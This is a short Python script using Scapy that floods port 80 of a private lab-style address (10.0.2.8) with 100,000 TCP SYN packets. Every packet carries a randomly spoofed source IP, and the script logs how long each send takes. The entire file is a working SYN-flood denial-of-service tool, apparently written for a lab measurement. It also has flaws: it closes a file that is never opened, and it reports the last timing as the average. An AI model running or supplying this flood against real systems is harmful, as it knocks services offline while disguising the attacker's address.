#!/usr/local/bin/python3.8
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
import time
import random
from ipaddress import IPv4Address

def random_ip_address():
        bits = random.getrandbits(32)  # generates an integer with 32 random bits
        addr = IPv4Address(bits)  # instances an IPv4Address object from those bits
        return str(addr)  # get the IPv4Address object's string representation

# ---------------MAIN-SCRIPT-----------------#
#results = open("syn_results_p.txt","a")
sum = 0
src_IP = random_ip_address()
src_PORT = 1234
dst_PORT = 80
ip = IP(src=[src_IP], dst=['10.0.2.8'])
SYN = TCP(sport=src_PORT, dport=dst_PORT, flags='S', seq=1000)
for i in range(0, 10*10000):
    ip.src = random_ip_address()
    start = time.time()
    send(ip / SYN,verbose=0)
    end = time.time()
    delta = end - start
    sum = sum + delta
    print(str(i)+":"+str(delta))
    #results.write(str(i)+":"+str(delta)+"\n")
#results.write("AVG : "+str(delta)+"\n")
print("AVG : "+str(delta)+"\n")
results.close()